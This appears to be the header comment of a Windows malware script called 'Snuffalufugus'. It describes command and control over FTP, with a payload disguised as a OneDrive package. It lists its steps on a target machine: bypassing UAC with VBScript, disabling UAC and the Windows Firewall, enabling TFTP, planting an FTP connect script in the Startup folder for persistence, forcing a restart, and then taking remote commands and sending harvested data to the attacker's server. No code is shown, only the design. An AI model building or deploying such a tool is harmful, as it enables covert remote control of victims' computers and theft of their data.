# ~Snuffalufugus~
# Requirements:
# FTP Client on local machine
# Remotely accessible FTP Server
# Windows OS Device/VM and target
# Store One_Drive_Expansion_Package.bat file on FTP server
# Description:
# C&C over FTP
# Enables persistent remote access on a Windows 10 device over FTP
# Instructs the following on a target:
# Use VBScript to bypass UAC
# Launch an Administrative Command Prompt
# Disable UAC security feature
# Disable Windows Firewall
# Enable TFTP Client
# Write FTP connect script to users Startup folder  
# Force system restart to activating features
# Launch a connection to remote FTP server upon startup
# Use FTP client "put" and "get" commands to transmit and recieve data with pre-specified file names
# Take commands from a remote server to control the system/harvest data
# Notes: Payload Provided is intended for the retreival of system metadata
# Future features: Background Persistance,Command Interface with selectable payloads,Adjustable time for reverse connections
